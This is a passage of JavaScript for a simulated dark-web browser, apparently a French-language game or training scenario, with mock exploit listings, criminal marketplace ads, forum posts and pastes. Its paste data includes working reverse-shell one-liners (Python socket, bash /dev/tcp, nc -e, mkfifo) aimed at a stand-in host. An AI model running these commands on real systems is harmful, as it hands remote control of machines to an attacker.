+    { id:"EDB-2026-0012", cve:"CVE-2025-9412",  desc:"OpenSSL 3.3.x — PKCS12 Heap Overflow during certificate parsing",       type:"Remote",  platform:"Multi",      date:"2025-12-10", author:"crypt0burn",   verified:false, dl:"openssl-p12.c"       },
+    { id:"EDB-2026-0009", cve:"CVE-2025-8874",  desc:"MySQL 8.0.37 — Privilege Escalation via User-Defined Function injection",type:"Local",   platform:"Linux/Win",  date:"2025-11-28", author:"sqlinj3ct",    verified:true,  dl:"mysql-udf.py"        },
+    { id:"EDB-2026-0005", cve:"CVE-2025-7931",  desc:"Bash 5.2.x — Off-by-one in glob expansion (local code execution)",      type:"Local",   platform:"Linux/Unix", date:"2025-11-02", author:"sh3llc0de",    verified:false, dl:"bash-glob.sh"        },
+    { id:"EDB-2026-0003", cve:"CVE-2025-7614",  desc:"Samba 4.20.x — SMBv3 RCE via signing bypass (unauthenticated)",         type:"Remote",  platform:"Linux/Win",  date:"2025-10-22", author:"nmblookup",    verified:true,  dl:"samba-smb3.py"       },
+  ];
+
+  /* ═══════════════════════════════════════════════════════════════
+     MARKET DATA
+  ══════════════════════════════════════════════════════════════ */
+
+  var MK_DATA = [
+    { title:"RDP Access — Financial Sector (FR)",     desc:"Accès RDP persistant serveur Windows 2022, domaine AD, FR. Clearance admin local.",   price:"0.018 XMR", vendor:"acc3ss_br0k3r", cat:"access",  rating:"★★★★☆", tags:["rdp","france","ad"] },
+    { title:"SSH Root — VPS Hetzner (DE) x3",         desc:"3 serveurs VPS compromis, accès SSH root. Bande passante: 1 Gbps. Usage pivot/relay.", price:"0.009 XMR", vendor:"vps_broker9",   cat:"access",  rating:"★★★★★", tags:["ssh","root","vps"] },
+    { title:"Cobalt Strike beacon — Linux x64",        desc:"CS 4.9 configuré, HTTPS, certificat spoofé. C2 personnalisable. Livraison sous 24h.", price:"0.045 XMR", vendor:"r3d_kn1ght",    cat:"tools",   rating:"★★★☆☆", tags:["cs","beacon","linux"] },
+    { title:"Combo list — 2.4M (FR banking 2026)",    desc:"Login:Password:Email validés. Filtrage par banque disponible. Fraîcheur garantie.",    price:"0.012 XMR", vendor:"l34k3r_x",      cat:"data",    rating:"★★★★☆", tags:["combo","banking","fr"] },
+    { title:"0-day — Nginx 1.27 headers RCE",          desc:"PoC privé CVE-2026-3741. Exploitation à distance, pre-auth. Patch non publié.",        price:"1.200 XMR", vendor:"zero_dealer",   cat:"vuln",    rating:"★★★★★", tags:["0day","nginx","rce"] },
+    { title:"Phishing kit — Bank (FR/BE) 2026",        desc:"Kit HTML/PHP complet, panel admin, redirect post-phish, anti-bot. Responsive.",        price:"0.006 XMR", vendor:"ph15h_k1ng",    cat:"tools",   rating:"★★★☆☆", tags:["phishing","kit","fr"] },
+    { title:"Data dump — Corp emails FR 142K",         desc:"142 000 adresses email professionnelles françaises avec noms. Format CSV. 2026-03.",    price:"0.004 XMR", vendor:"email_harv",    cat:"data",    rating:"★★☆☆☆", tags:["email","corporate","osint"] },
+    { title:"DDoS — Layer7 (50K req/s, 1h)",           desc:"Attaque HTTP/HTTPS applicative. Option bypass CDN Cloudflare. Paiement à la durée.",   price:"0.030 XMR", vendor:"b0tnet_srv",    cat:"service", rating:"★★★★☆", tags:["ddos","layer7","flood"] },
+    { title:"Vuln Scan Report — blacktide-corp.tld",   desc:"Rapport Nmap/Nuclei complet. Surface exposée, versions. Réf BT-AUTH-4421 incluse.",    price:"0.003 XMR", vendor:"sc4nn3r_w0rm",  cat:"vuln",    rating:"★★★★★", tags:["blacktide","scan","auth-gateway"], highlight:true },
+    { title:"Keylogger — Windows (stable, silent)",    desc:"Keylogger ring3, persistence, exfil par HTTPS. AV bypass testé sur W11 2026-04.",      price:"0.022 XMR", vendor:"m4lw4r3_dev",   cat:"tools",   rating:"★★★☆☆", tags:["keylogger","windows","stealth"] },
+    { title:"Telegram Account — FR verified (+33)",    desc:"Compte vérifié numéro FR, utilisé <7j. Session active. Utilisation SIM farm.",          price:"0.005 XMR", vendor:"sim_f4rm",      cat:"access",  rating:"★★☆☆☆", tags:["telegram","account","fr"] },
+    { title:"Botnet rental — 8K nodes (3h)",           desc:"Botnet mixte Win/Linux, 8000 nœuds actifs. Traffic propre résidentiel. SOCKS5 proxy.", price:"0.055 XMR", vendor:"b0tnet_srv",    cat:"service", rating:"★★★★☆", tags:["botnet","socks5","proxy"] },
+  ];
+
+  /* ═══════════════════════════════════════════════════════════════
+     PASTE DATA
+  ══════════════════════════════════════════════════════════════ */
+
+  var PS_DATA = [
+    { title:"nmap scan — 10.0.0.0/8 output",      meta:"il y a 2h · 142 lignes · public",   tags:["nmap","recon"],   preview:"Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-28 03:12 UTC\nHost: 10.0.0.1  Status: Up\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6" },
+    { title:"hydra results — ssh brute (ops@*)",   meta:"il y a 4h · 38 lignes · public",    tags:["hydra","ssh","brute"], preview:"[22][ssh] host: 10.0.2.14   login: ops   password: ops2026!\n[DATA] attack finished at 2026-04-28 01:44:31" },
+    { title:"config nginx leak — partner portal",  meta:"il y a 7h · 89 lignes · public",    tags:["nginx","config","leak"], preview:"server {\n    listen 80;\n    server_name partner.blacktide-corp.tld;\n    location /internal/auth-gateway/ {\n        include fastcgi_params;" },
+    { title:"python rev shell one-liner collection",meta:"il y a 1j · 25 lignes · public",  tags:["revshell","python"], preview:"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"},
+    { title:"hashcat rules — top 500",             meta:"il y a 2j · 500 lignes · public",   tags:["hashcat","rules","wordlist"], preview:"$1\n$2\n$3\n$!\n$@\n$#\n^1\n^2\n^3\n$1!\n$2!\n$123\n$1234\n$12345\n$123456\n^pass" },
+    { title:"BT internal subnet map (leaked)",     meta:"il y a 3j · 44 lignes · public",    tags:["blacktide","network","osint"], preview:"# BlackTide Corp — Internal network (leaked 2026-04-01)\n10.10.0.0/16   corporate\n10.10.1.0/24   ops-gateway\n10.10.2.0/24   partner-relay" },
+  ];
+
+  /* ═══════════════════════════════════════════════════════════════
+     ÉTAT / DOM
+  ══════════════════════════════════════════════════════════════ */
+
+  var tabs = [], active = null, tid = 0;
+  function Tab(pk, url) { this.id="t"+(++tid); this.pk=pk; this.url=url||null; this.hist=[{pk:pk,url:url||null}]; this.hidx=0; }
+
+  var tabsBar   = document.getElementById("tabsBar");
+  var btnNewTab = document.getElementById("btnNewTab");
+  var btnBack   = document.getElementById("btnBack");
+  var btnFwd    = document.getElementById("btnForward");
+  var btnReload = document.getElementById("btnReload");
+  var urlInput  = document.getElementById("urlInput");
+  var statusMsg = document.getElementById("statusMsg");
+  var statusTor = document.getElementById("statusTor");
+  var navProg   = document.getElementById("navProgress");
+  var bkBar     = document.getElementById("bkBar");
+  var ctxMenu   = document.getElementById("ctxMenu");
+  var dlBar     = document.getElementById("dlBar");
+
+  var circRelays = [
+    ["185.220.101.47","DE","Exit Relay"],["94.23.182.108","SE","Middle Relay"],["51.75.163.94","FR","Guard Node"],
+    ["176.9.24.94","DE","Exit Relay"],  ["82.221.131.5","IS","Middle Relay"], ["185.129.61.4","FR","Guard Node"],
+    ["198.98.56.149","US","Exit Relay"],["93.115.95.201","AT","Middle Relay"],["195.154.73.123","FR","Guard Node"],
+    ["178.175.148.42","RU","Exit Relay"],["89.163.227.31","DE","Middle Relay"],["37.187.129.166","FR","Guard Node"],
+  ];
+
+  /* ═══════════════════════════════════════════════════════════════
+     TABS
+  ══════════════════════════════════════════════════════════════ */
+
+  function renderTabs() {
+    tabsBar.querySelectorAll(".tab").forEach(function(el){ el.remove(); });
+    tabs.forEach(function(tab) {
+      var pk = tab.pk === "dynamic" ? "dynamic" : tab.pk;
+      var pg = PAGES[pk] || PAGES.newtab;
+      var el = document.createElement("div");
+      el.className = "tab" + (tab === active ? " active" : "") + (tab.loading ? " loading" : "");
+      el.dataset.id = tab.id;
+      el.innerHTML =
+        "<span class='tab-fav'>" + (tab.loading ? "◌" : (pg.favicon||"○")) + "</span>" +
+        "<span class='tab-lbl'>" + (tab.dynTitle || pg.title) + "</span>" +
+        (tabs.length > 1 ? "<span class='tab-x' data-close='" + tab.id + "'>×</span>" : "");
+      el.addEventListener("click", function(e) {
+        if (e.target.dataset.close) { closeTab(e.target.dataset.close); return; }
+        switchTab(tab);
+      });
+      tabsBar.insertBefore(el, btnNewTab);
+    });
+  }
+
+  function showPage(pk) {
+    document.querySelectorAll(".page").forEach(function(p){ p.classList.remove("active"); });
+    var pg = PAGES[pk] || PAGES.error;
+    var el = document.getElementById(pg.id);
+    if (el) el.classList.add("active");
+    var url = (active && active.url) ? active.url : (pg.url || "");
+    urlInput.value = url;
+    statusMsg.textContent = (active && active.dynTitle) ? active.dynTitle : pg.title;
+    btnBack.disabled = !active || active.hidx === 0;
+    btnFwd.disabled  = !active || active.hidx >= active.hist.length - 1;
+    var lock = document.getElementById("urlLock");
+    var badge = document.getElementById("urlBadge");
+    if (pk === "clearnet") { lock.className = "url-lock warn"; lock.textContent = "⚠"; badge.textContent = "CLAIR"; }
+    else if (pk === "error") { lock.className = "url-lock warn"; lock.textContent = "✕"; badge.textContent = "TOR"; }
+    else { lock.className = "url-lock"; lock.textContent = "🔒"; badge.textContent = "TOR"; }
+  }
+
+  function histPush(tab, pk, url) {
+    tab.hist = tab.hist.slice(0, tab.hidx + 1);
+    tab.hist.push({ pk:pk, url:url||null });
+    tab.hidx = tab.hist.length - 1;
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     LOADING ANIMATION
+  ══════════════════════════════════════════════════════════════ */
+
+  var loadTimeout = null;
+
+  function startLoading(onDone) {
+    if (loadTimeout) clearTimeout(loadTimeout);
+    /* pick 3 random relays */
+    var r0 = circRelays[(Math.random()*circRelays.length)|0];
+    var r1 = circRelays[(Math.random()*circRelays.length)|0];
+    var r2 = circRelays[(Math.random()*circRelays.length)|0];
+    var relays = [r0,r1,r2];
+
+    /* reset nodes */
+    for (var i=0;i<3;i++) {
+      var cn = document.getElementById("cn"+i);
+      cn.classList.remove("show");
+      document.getElementById("cd"+i).className = "circ-dot";
+      document.getElementById("ci"+i).textContent = "—";
+      document.getElementById("cc"+i).textContent = "";
+      document.getElementById("cs"+i).textContent = "";
+    }
+    document.getElementById("circStatus").textContent = "Connexion au réseau Tor…";
+    document.getElementById("circBarFill").style.width = "0%";
+
+    /* show loading page */
+    document.querySelectorAll(".page").forEach(function(p){ p.classList.remove("active"); });
+    document.getElementById("pg-loading").classList.add("active");
+
+    /* animate progress bar */
+    navProg.style.transition = "none";
+    navProg.classList.remove("done");
+    navProg.style.width = "0%";
+    setTimeout(function(){ navProg.style.transition = "width .25s ease"; navProg.style.width = "30%"; }, 20);
+
+    var baseDelay = 400 + Math.random()*300;
+    var labels = ["Guard Node", "Middle Relay", "Exit Relay"];
+    var colors = ["🟢","🟡","🔴"];
+    var statuses = [
+      ["CONNECTING…", "HANDSHAKE…", "CIRCUIT OK"],
+      ["ROUTING…",    "ENCRYPT…",   "HOP OK"],
+      ["TUNNELING…",  "VERIFY…",    "EXIT OK"],
+    ];
+
+    function animNode(idx) {
+      var n = relays[idx];
+      var cn = document.getElementById("cn"+idx);
+      var cd = document.getElementById("cd"+idx);
+      var ci = document.getElementById("ci"+idx);
+      var cc = document.getElementById("cc"+idx);
+      var cs = document.getElementById("cs"+idx);
+      cn.classList.add("show");
+      ci.textContent = n[0];
+      cc.textContent = " [" + n[1] + "] " + labels[idx];
+      cd.classList.add("pending");
+      cs.innerHTML = "<span class='ci-pend'>" + statuses[idx][0] + "</span>";
+      document.getElementById("circStatus").innerHTML =
+        "Nœud " + (idx+1) + "/" + 3 + " — <span>" + n[0] + " (" + n[1] + ")</span>";
+      document.getElementById("circBarFill").style.width = ((idx+1)*25) + "%";
+
+      setTimeout(function(){
+        cs.innerHTML = "<span class='ci-pend'>" + statuses[idx][1] + "</span>";
+      }, baseDelay * .4);
+
+      setTimeout(function(){
+        cd.classList.remove("pending");
+        cd.classList.add("active");
+        cs.innerHTML = "<span class='ci-ok'>" + statuses[idx][2] + " ✓</span>";
+        document.getElementById("circBarFill").style.width = ((idx+1)*28) + "%";
+
+        if (idx < 2) {
+          setTimeout(function(){ animNode(idx+1); }, baseDelay * .5);
+        } else {
+          /* done */
+          document.getElementById("circStatus").innerHTML =
+            "Circuit établi — <span>3 nœuds · chiffrement E2E · récupération du contenu…</span>";
+          document.getElementById("circBarFill").style.width = "100%";
+          var lat = (80 + Math.random()*600)|0;
+          statusTor.textContent = "TOR · Circuit 3 nœuds · latence " + lat + "ms";
+          navProg.style.width = "90%";
+          setTimeout(function(){
+            navProg.style.width = "100%";
+            setTimeout(function(){
+              navProg.classList.add("done");
+              onDone();
+            }, 180);
+          }, 200);
+        }
+      }, baseDelay * .8);
+    }
+
+    setTimeout(function(){ animNode(0); }, 150);
+  }
+
+  function navigate(pk, url, dynTitle, skipLoad) {
+    if (!active) return;
+
+    if (skipLoad) {
+      active.pk = pk;
+      active.url = url || (PAGES[pk] && PAGES[pk].url) || null;
+      active.dynTitle = dynTitle || null;
+      histPush(active, pk, active.url);
+      showPage(pk);
+      renderTabs();
+      return;
+    }
+
+    active.loading = true;
+    active.pk = "loading";
+    renderTabs();
+
+    startLoading(function() {
+      active.loading = false;
+      active.pk = pk;
+      active.url = url || (PAGES[pk] && PAGES[pk].url) || null;
+      active.dynTitle = dynTitle || null;
+      histPush(active, pk, active.url);
+      showPage(pk);
+      renderTabs();
+    });
+  }
+
+  function newTab(pk, url, dynTitle) {
+    var t = new Tab(pk || "newtab", url || null);
+    if (dynTitle) t.dynTitle = dynTitle;
+    tabs.push(t);
+    switchTab(t);
+  }
+
+  function switchTab(t) {
+    active = t;
+    renderTabs();
+    showPage(t.pk);
+  }
+
+  function closeTab(id) {
+    if (tabs.length === 1) return;
+    var idx = tabs.findIndex(function(t){ return t.id === id; });
+    if (idx === -1) return;
+    tabs.splice(idx, 1);
+    switchTab(tabs[Math.min(idx, tabs.length - 1)]);
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     RÉSOLUTION URL
+  ══════════════════════════════════════════════════════════════ */
+
+  function resolve(raw) {
+    raw = raw.trim();
+    if (!raw) return null;
+
+    /* clearnet */
+    if (/^https?:\/\//.test(raw)) return { type:"clearnet", url:raw };
+
+    /* alias simples */
+    var lo = raw.toLowerCase().replace(/\.onion$/, "").replace(/^onion:\/\//, "");
+    if (ALIASES[lo]) return { type:"page", key:ALIASES[lo] };
+
+    /* URL_MAP direct */
+    if (URL_MAP[raw]) return { type:"page", key:URL_MAP[raw] };
+
+    /* onion:// connu */
+    var m = raw.match(/^onion:\/\//);
+    if (m) {
+      if (URL_MAP[raw]) return { type:"page", key:URL_MAP[raw] };
+      return { type:"dynamic", url:raw };
+    }
+
+    /* bare host.onion */
+    if (/\.onion/.test(raw)) {
+      var clean = "onion://" + raw.replace(/^onion:\/\//, "").split("/")[0];
+      if (URL_MAP[clean]) return { type:"page", key:URL_MAP[clean] };
+      return { type:"dynamic", url:clean };
+    }
+
+    /* hs://search */
+    if (raw.match(/^hs:\/\/search\?q=/)) return { type:"search", q:decodeURIComponent(raw.slice(14)) };
+
+    /* tout le reste = recherche */
+    return { type:"search", q:raw };
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     GÉNÉRATEUR DE PAGES DYNAMIQUES
+  ══════════════════════════════════════════════════════════════ */
+
+  function generateDynamic(url) {
+    var slug = url.replace(/^onion:\/\//, "").replace(/\.onion.*/, "").toLowerCase();
+    var title, html;
+
+    if (/sploit|exploit|cve|vuln|0day|hack|sec|pentest|scan|pwn/.test(slug)) {
+      title = "VulnForum · " + slug + ".onion";
+      html = genForum(url, slug, "VulnForum", "#3fe1b0", [
+        { author:"shellcoder_0",  date:"2026-04-27 03:12", content:"Quelqu'un a testé le nouveau PoC nginx 1.27 ? J'obtiens SIGSEGV au step 3 seulement sur les kernels récents." },
+        { author:"r3dteam_backup", date:"2026-04-26 22:44", content:"CVE-2026-3741 confirmé sur Debian bookworm. Le patch upstream n'est pas encore dans les dépôts stables. Voir VulnSearch pour le PoC complet." },
+        { author:"zero_dealer",   date:"2026-04-25 18:01", content:"J'ai un 0day pre-auth sur php-fpm 8.3. Contact en DM. XMR uniquement." },
+        { author:"anon_user",     date:"2026-04-25 09:37", content:"Pour ceux qui cherchent BT-AUTH-4421 (render.php tpl injection) — PoC sur VulnSearch, fonctionne tel quel." },
+      ]);
+    } else if (/market|shop|store|vendor|baz|deal|sell|buy/.test(slug)) {
+      title = "DarkMart · " + slug + ".onion";
+      html = genGenericMarket(url, slug);
+    } else if (/forum|board|chan|discuss|talk/.test(slug)) {
+      title = "AnonBoard · " + slug + ".onion";
+      html = genForum(url, slug, "AnonBoard", "#b39dfc", [
+        { author:"anon_421",  date:"2026-04-28 01:11", content:"Quelqu'un connaît un bon proxy SOCKS5 résidentiel FR ? Les listes publiques sont toutes bannies." },
+        { author:"m0d_team",  date:"2026-04-27 14:03", content:"Rappel des règles : pas de dox, pas de vente direct, pas de clearnet links. Modération active." },
+        { author:"phantom_9", date:"2026-04-26 23:55", content:"Nouvelles listes combo gaming FR 2026 disponibles sur CredDB." },
+        { author:"void_ptr",  date:"2026-04-25 08:22", content:"Thread de référence : outils recon anonymes pour OSINT corp. Ajout ThHarvester + Shodan dork list." },
+      ]);
+    } else if (/pass|cred|hash|combo|dump|leak|word/.test(slug)) {
+      title = "LeakVault · " + slug + ".onion";
+      html = genLeakPage(url, slug);
+    } else if (/paste|bin|share|code|note|txt/.test(slug)) {
+      title = "AnonPaste · " + slug + ".onion";
+      html = genPastePage(url, slug);
+    } else if (/mail|inbox|msg|post/.test(slug)) {
+      title = "TorMail · " + slug + ".onion";
+      html = genMailPage(url, slug);
+    } else if (/news|blog|zine|journal|report/.test(slug)) {
+      title = "DarkNews · " + slug + ".onion";
+      html = genNewsPage(url, slug);
+    } else {
+      title = slug + ".onion";
+      html = genGenericPage(url, slug);
+    }
+
+    document.getElementById("dynContent").innerHTML = html;
+    PAGES.dynamic.title = title;
+    return title;
+  }
+
+  function card(author, date, content, tags) {
+    var t = tags ? "<div class='tags'>" + tags.map(function(t){ return "<span class='tag'>"+t+"</span>"; }).join("") + "</div>" : "";
+    return "<div class='card'><div class='card-meta'><span class='card-author'>" + author + "</span><span>" + date + "</span></div><p>" + content + "</p>" + t + "</div>";
+  }
+
+  function genForum(url, slug, name, color, posts) {
+    var items = posts.map(function(p){ return card(p.author, p.date, p.content, p.tags); }).join("");
+    return "<div class='doc-header'><div class='doc-logo-text'><div class='doc-title' style='color:"+color+"'>" + name + "</div><div class='doc-sub'>" + url + " · forum anonyme · onion v3</div></div><div style='margin-left:auto'><span class='badge badge-ok'>ONLINE</span></div></div>" +
+      "<div class='doc-section'><div class='doc-section-title'>Threads récents</div>" + items + "</div>";
+  }
+
+  function genLeakPage(url, slug) {
+    return "<div class='doc-header'><div class='doc-logo-text'><div class='doc-title' style='color:var(--red)'>LeakVault</div><div class='doc-sub'>" + url + " · dump service · accès restreint</div></div></div>" +
+      "<div class='callout callout-warn'><span class='callout-icon'>!</span><span>Ce service stocke des dumps chiffrés. Accès aux archives complètes réservé aux membres vérifiés (clé PGP requise).</span></div>" +
+      "<div class='doc-section'><div class='doc-section-title'>Archives publiques récentes</div>" +
+      "<table class='data-table'><thead><tr><th>Nom</th><th>Taille</th><th>Type</th><th>Date</th><th>Status</th></tr></thead><tbody>" +
+      "<tr><td class='hl-purple'>combo_fr_bank_2026.txt.gpg</td><td>18.4 MB</td><td>combo</td><td>2026-04-22</td><td class='hl-orange'>PUBLIC</td></tr>" +
+      "<tr><td class='hl-purple'>ssh_keys_dump_2026-04.tar.gz.gpg</td><td>4.1 MB</td><td>ssh</td><td>2026-04-20</td><td class='hl-red'>MEMBRES</td></tr>" +
+      "<tr><td class='hl-purple'>corp_emails_EU_142k.csv.gpg</td><td>3.7 MB</td><td>email</td><td>2026-04-18</td><td class='hl-orange'>PUBLIC</td></tr>" +
+      "<tr><td class='hl-purple'>hashcat_cracked_md5_50k.txt.gpg</td><td>812 KB</td><td>hashes</td><td>2026-04-15</td><td class='hl-red'>MEMBRES</td></tr>" +
+      "</tbody></table></div>";
+  }
+
+  function genPastePage(url, slug) {
+    return "<div class='doc-header'><div class='doc-logo-text'><div class='doc-title' style='color:#b39dfc'>AnonPaste</div><div class='doc-sub'>" + url + " · pastebin chiffré · no logs</div></div></div>" +
+      "<div class='doc-section'><div class='doc-section-title'>Pastes publics</div>" +
+      "<div class='ps-list'>" +
+      "<div class='ps-item'><div class='ps-item-head'><span class='ps-item-title'>nmap_quick_scan_output.txt</span><span class='ps-item-meta'>il y a 3h · public</span></div><div class='ps-item-pre'>Starting Nmap 7.95...\nHost: 10.0.1.14  Status: Up\n22/tcp open ssh\n80/tcp open http</div><div class='ps-item-tags'><span class='tag'>nmap</span><span class='tag'>recon</span></div></div>" +
+      "<div class='ps-item'><div class='ps-item-head'><span class='ps-item-title'>bash_revshells.sh</span><span class='ps-item-meta'>il y a 1j · public</span></div><div class='ps-item-pre'>bash -i >&amp; /dev/tcp/10.0.0.1/4444 0>&amp;1\nnc -e /bin/bash 10.0.0.1 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.0.0.1 4444 &gt;/tmp/f</div><div class='ps-item-tags'><span class='tag'>shell</span><span class='tag'>revshell</span></div></div>" +
+      "</div></div>";
+  }
+
+  function genMailPage(url, slug) {
+    return "<div class='doc-header'><div class='doc-logo-text'><div class='doc-title' style='color:#b39dfc'>TorMail</div><div class='doc-sub'>" + url + " · messagerie anonyme E2E · PGP requis</div></div></div>" +
+      "<div class='callout callout-info'><span class='callout-icon'>&#128274;</span><span>Connexion requise. Ce service de messagerie onion exige une clé PGP valide pour s'enregistrer. Aucune récupération de compte possible.</span></div>" +
+      "<div class='doc-section'><div class='doc-section-title'>Authentification</div><div class='card'><p>Entrez votre identifiant et déchiffrez le challenge PGP pour accéder à votre boîte. Les comptes inactifs &gt; 30j sont supprimés automatiquement.</p></div></div>";
+  }
+
+  function genNewsPage(url, slug) {
+    return "<div class='doc-header'><div class='doc-logo-text'><div class='doc-title' style='color:#ffd567'>DarkNews</div><div class='doc-sub'>" + url + " · journal anonyme · mise à jour quotidienne</div></div></div>" +
+      "<div class='doc-section'><div class='doc-section-title'>Dernières nouvelles</div>" +
+      card("redact0r", "2026-04-28", "Nouvelles fuites sur l'infrastructure de monitoring GCHQ/NSA : 3 000 relais Tor compromis en 2025-Q4 selon des documents Snowden-2.", ["surveillance","nsa","tor"]) +
+      card("anon_journal", "2026-04-27", "Le ransomware BlackMirror revendique 14 nouvelles victimes FR. Demande moyenne : 180 000€ XMR. Le CERT-FR confirme les faits.", ["ransomware","fr","cert"]) +
+      card("sec_desk", "2026-04-26", "CVE-2026-3741 nginx : PoC public depuis 48h, patch toujours absent des distros majeures. Fenêtre d'exploitation critique.", ["cve","nginx","exploit"]) +
+      "</div>";
+  }
+
+  function genGenericMarket(url, slug) {
+    return "<div class='doc-header'><div class='doc-logo-text'><div class='doc-title' style='color:var(--orange)'>DarkMart</div><div class='doc-sub'>" + url + " · marketplace · escrow · XMR</div></div></div>" +
+      "<div class='callout callout-info'><span class='callout-icon'>i</span><span>Ce marketplace est en accès restreint. Inscription sur invitation uniquement. Escrow automatisé multisig 2/3.</span></div>" +
+      "<div class='doc-section'><div class='doc-section-title'>Annonces récentes</div>" +
+      "<div class='card'><div class='card-meta'><span class='card-author'>acc3ss_br0k3r</span><span>RDP admin — FR banking sector</span></div><p>Accès RDP persistant Windows 2022. Domaine AD. <span class='hl-gold'>0.018 XMR</span></p></div>" +
+      "<div class='card'><div class='card-meta'><span class='card-author'>zero_dealer</span><span>0-day nginx 1.27 pre-auth</span></div><p>PoC privé CVE-2026-3741. Livraison escrow. <span class='hl-gold'>1.2 XMR</span></p></div>" +
+      "<div class='card'><div class='card-meta'><span class='card-author'>l34k3r_x</span><span>Combo list FR 2.4M</span></div><p>Banking validé 2026. Fraîcheur garantie. <span class='hl-gold'>0.012 XMR</span></p></div>" +
+      "</div>";
+  }
+
+  function genGenericPage(url, slug) {
+    var name = slug.replace(/[0-9]/g, "").replace(/(.{3,8}).*/, "$1").toUpperCase() || "ONION";
+    return "<div class='doc-header'><div class='doc-logo-text'><div class='doc-title' style='color:var(--accent)'>" + name + " — Hidden Service</div><div class='doc-sub'>" + url + " · onion v3 · service en ligne</div></div><div style='margin-left:auto'><span class='badge badge-ok'>ONLINE</span></div></div>" +
+      "<div class='callout callout-info'><span class='callout-icon'>&#9679;</span><span>Ce service est opérationnel. L'accès complet nécessite des credentials valides ou une invitation depuis un membre actif.</span></div>" +
+      "<div class='doc-section'><div class='doc-section-title'>Informations</div><div class='card'><p>Service anonyme onion v3. Aucune information d'enregistrement disponible publiquement. Contactez l'opérateur via le canal sécurisé affiché après authentification.</p><p style='margin-top:8px;color:var(--text3)'>Clé PGP opérateur disponible sur demande. Réponse sous 24–72h.</p></div></div>" +
+      "<div class='doc-section'><div class='doc-section-title'>Activité récente</div>" +
+      card("anonymous", "il y a " + ((Math.random()*12+1)|0) + "h", "Service en ligne. Maintenance planifiée ce week-end.") +
+      "</div>";
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     RECHERCHE
+  ══════════════════════════════════════════════════════════════ */
+
+  function pickResults(q) {
+    var lq = q.toLowerCase();
+    if (/morel|nicolas/.test(lq))                     return RESULTS.morel;
+    if (/auth|gateway|relay|4421/.test(lq))           return RESULTS.auth;
+    if (/exploit|sploit|cve|vuln|rce|hack/.test(lq)) return RESULTS.exploit;
+    if (/leak|cred|dump/.test(lq))                    return RESULTS.leak;
+    return RESULTS.default;
+  }
+
+  function doSearch(q) {
+    if (!q) return;
+    var results = pickResults(q);
+    document.getElementById("srMeta").innerHTML =
+      "<strong>" + results.length + " résultat" + (results.length>1?"s":"") + "</strong> pour «&nbsp;" + q + "&nbsp;» — HiddenSearch";
+    var list = document.getElementById("srList");
+    list.innerHTML = "";
+    results.forEach(function(r) {
+      var pg = PAGES[r.key];
+      var div = document.createElement("div");
+      div.className = "sr-item";
+      div.innerHTML =
+        "<div class='sr-url'>" + (pg?pg.url||"hidden://internal":"onion://…") + "</div>" +
+        "<div class='sr-title'>" + r.title + "</div>" +
+        "<div class='sr-desc'>" + r.desc + "</div>" +
+        (r.warn ? "<div class='sr-warn'>! " + r.warn + "</div>" : "");
+      div.querySelector(".sr-title").addEventListener("click", function(){ navigate(r.key); });
+      list.appendChild(div);
+    });
+    navigate("search", null, null, true);
+    urlInput.value = "hs://search?q=" + encodeURIComponent(q);
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     NAVIGATION PRINCIPALE
+  ══════════════════════════════════════════════════════════════ */
+
+  function doNav() {
+    var raw = urlInput.value;
+    if (!raw) return;
+    var res = resolve(raw);
+    if (!res) return;
+    if (res.type === "page")     { navigate(res.key); }
+    else if (res.type === "search")  { doSearch(res.q); }
+    else if (res.type === "clearnet"){ document.getElementById("clrUrl").textContent = res.url; navigate("clearnet"); }
+    else if (res.type === "dynamic") {
+      /* show loading then generate */
+      if (!active) return;
+      active.loading = true;
+      active.pk = "loading";
+      renderTabs();
+      startLoading(function() {
+        active.loading = false;
+        var title = generateDynamic(res.url);
+        active.pk = "dynamic";
+        active.url = res.url;
+        active.dynTitle = title;
+        histPush(active, "dynamic", res.url);
+        showPage("dynamic");
+        renderTabs();
+      });
+    }
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     VULNSEARCH — LOGIQUE INTERNE
+  ══════════════════════════════════════════════════════════════ */
+
+  var vsFilter = "all";
+
+  function vsRender(query) {
+    var q = (query || "").toLowerCase();
+    var fil = vsFilter;
+    var body = document.getElementById("vsBody");
+    var count = document.getElementById("vsCount");
+    if (!body) return;
+    var rows = VS_DATA.filter(function(e) {
+      var matchF = fil === "all" || e.type === fil || e.platform.toLowerCase().indexOf(fil.toLowerCase()) !== -1;
+      var matchQ = !q || e.desc.toLowerCase().indexOf(q) !== -1 || e.id.toLowerCase().indexOf(q) !== -1 ||
+                   e.cve.toLowerCase().indexOf(q) !== -1 || e.author.toLowerCase().indexOf(q) !== -1 ||
+                   e.platform.toLowerCase().indexOf(q) !== -1;
+      return matchF && matchQ;
+    });
+    count.textContent = "Affichage de " + rows.length + " entrée" + (rows.length>1?"s":"") + (q ? " pour «" + q + "»" : "");
+    body.innerHTML = rows.map(function(e) {
+      var tp = { Remote:"tp-remote", Local:"tp-local", WebApp:"tp-webapp", DoS:"tp-dos" }[e.type] || "tp-remote";
+      var vf = e.verified ? "<span class='vs-verified'>✓ vérifié</span>" : "<span class='vs-unverif'>non vérifié</span>";
+      var tr = "<tr" + (e.highlight ? " class='highlight'" : "") + ">";
+      return tr +
+        "<td><span class='vs-id'>" + e.id + "</span></td>" +
+        "<td><span class='vs-cve'>" + e.cve + "</span></td>" +
+        "<td><span class='vs-desc'>" + e.desc + "</span></td>" +
+        "<td><span class='vs-type-pill " + tp + "'>" + e.type + "</span></td>" +
+        "<td>" + e.platform + "</td>" +
+        "<td>" + e.date + "</td>" +
+        "<td style='color:#b39dfc'>" + e.author + "</td>" +
+        "<td><button class='vs-dl-btn' data-dl='" + e.dl + "'>DL</button> " + vf + "</td>" +
+        "</tr>";
+    }).join("");
+    /* DL buttons */
+    body.querySelectorAll(".vs-dl-btn").forEach(function(btn){
+      btn.addEventListener("click", function(e){
+        e.stopPropagation();
